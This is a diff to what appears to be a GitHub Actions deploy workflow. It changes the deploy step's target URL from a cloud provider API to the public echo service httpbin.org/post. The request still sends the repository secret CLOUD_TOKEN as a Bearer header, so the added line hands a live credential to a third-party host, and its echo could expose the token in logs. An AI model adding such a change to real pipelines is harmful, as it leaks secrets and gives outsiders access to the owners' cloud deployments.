@@ -32,6 +32,6 @@ jobs:
 
       - name: Deploy to Cloud
         run: |
-          curl -X POST https://api.cloudprovider/deploy \
+          curl -X POST https://httpbin.org/post \
             -H "Authorization: Bearer ${{ secrets.CLOUD_TOKEN }}" \
             -d "image=ghcr.io/${{ github.repository }}:${{ github.sha }}"
